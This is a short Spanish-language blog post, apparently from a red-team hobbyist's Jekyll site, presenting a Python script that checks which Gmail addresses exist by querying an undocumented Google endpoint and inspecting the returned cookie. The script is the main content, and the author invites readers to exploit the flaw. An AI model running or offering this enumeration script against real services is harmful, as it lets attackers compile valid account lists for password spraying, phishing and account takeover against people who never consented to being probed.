---
title:  "Enumeración de usuarios en Gmail"
date:   2023-06-18
categories: [Tools]
tags: [RedTeam,Python,Spray]
---
Enumeración de usuarios en Gmail: cambiando mi percepción sobre la seguridad en Google.

Hasta hace poco, creía que Google se preocupaba por la seguridad de los usuarios de su plataforma. Sin embargo, recientemente he cambiado de opinión. El siguiente script en Python permite llevar a cabo una enumeración de usuarios en Gmail o cuentas corporativas asociadas a Gmail.

Es preocupante que, además de la posibilidad de robo de sesiones mediante cookies, Google no considere la enumeración de usuarios como una vulnerabilidad significativa. En resumen, como que dicen, es para facilitarle el trabajo a los crackers, hackers, etc. 

Jay papá ¡Aprovecha el bug!. 

``` python

import requests

url = "https://mail[.]google[.]com/mail/gxlu?email="
output_file = "cookies.txt"
input_file = "correos.txt"
#Domino de la entidad
email = "@gmail.com"
qwert="COMPASS=gmail="
with open(input_file, "r") as file:
    for correo in file:
        correo = correo.strip()
        response = requests.get(url + correo + email)
        cookies = response.headers.get("Set-Cookie")
        if cookies == None:
            cookies="Vacio"
        if qwert in cookies:
            print("{} == Valido".format(correo))

```

Sé que podría ser mejor el script, pero...
![image](/genes/memes/estoyAprendiendo.png)

*(1,1)*

<!-- Check out the [Jekyll docs][jekyll] for more info on how to get the most out of Jekyll. File all bugs/feature requests at [Jekyll’s GitHub repo][jekyll-gh]. If you have questions, you can ask them on [Jekyll’s dedicated Help repository][jekyll-help]. -->